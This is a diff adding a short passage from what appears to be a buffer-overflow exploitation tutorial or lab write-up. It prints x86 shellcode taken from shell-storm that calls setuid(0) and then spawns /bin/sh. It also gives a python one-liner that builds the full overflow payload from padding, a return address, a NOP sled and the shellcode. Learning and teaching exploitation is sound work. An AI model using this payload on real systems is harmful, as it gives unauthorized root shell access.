@@ -1,0 +1,9 @@
+* Insert shell code in our comman
+We can use the website https://shell-storm.org/shellcode/index.html to get a shellcode.
+This one works https://shell-storm.org/shellcode/files/shellcode-516.html.
+\x31\xdb\x6a\x17\x58\xcd\x80\xf7\xe3\xb0\x0b\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80
+
+Create the payload
+The payload consists in padding + buffer address + NOP + shellcode.
+What is NOP ? It stands for "No Operations", basically it is used to make sure that our exploit doesn’t fail,because we won’t always point to the right address , so we add stuff that doesn’t do anything.
+So with that our shellcode is python -c 'print("\x90" * 140 + "\xb0\xf6\xff\xbf" + "\x90" * 100 + "\x31\xdb\x6a\x17\x58\xcd\x80\xf7\xe3\xb0\x0b\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80")'
